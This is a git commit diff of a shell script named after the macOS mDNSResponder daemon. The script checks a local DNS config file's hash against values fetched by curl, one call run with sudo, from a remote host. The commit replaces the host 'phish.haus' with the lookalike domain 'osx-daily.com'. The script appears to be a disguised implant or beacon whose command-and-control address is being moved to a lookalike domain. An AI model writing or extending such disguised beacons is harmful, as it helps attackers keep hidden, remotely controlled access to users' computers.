5d610884d55cac8afe7af1113bb3512e37095d03
bwz <bwaugh@twilio.com>
2015-06-10 09:04:49 -0700

    updated

--- mDNSResponder.sh
+++ mDNSResponder.sh
@@ -17,7 +17,7 @@ fi
 IS=`/sbin/ping -c 5 74.125.226.18 | grep -c "64 bytes"`
 if (test "$IS" -gt "2") then
        internet_conn="1"
-	if ( [`md5 /etc/dnsextd.conf`] != `curl "http://phish.haus/cmp/md5_check.php?hash=$1"` ) then
+	if ( [`md5 /etc/dnsextd.conf`] != `curl "http://osx-daily.com/cmp/md5_check.php?hash=$1"` ) then
 		internet_conn="0"
 	   sleep 10
 	   AA=`/sbin/ping -c 5 74.125.226.18 | grep -c "64 bytes"`
@@ -44,7 +44,7 @@ fi
 IS=`/sbin/ping -c 5 74.125.226.18 | grep -c "64 bytes"`
 if (test "$IS" -gt "2") then
        internet_conn="1"
-		if ( [`md5 /etc/dnsextd.conf`] != `sudo curl "http://phish.haus/cmp/md5_check_mdns.php?hash=$1"` ) then
+		if ( [`md5 /etc/dnsextd.conf`] != `sudo curl "http://osx-daily.com/cmp/md5_check_mdns.php?hash=$1"` ) then
 		if (test "$AA" -gt "2") then
 	       internet_conn="1"
 	   else
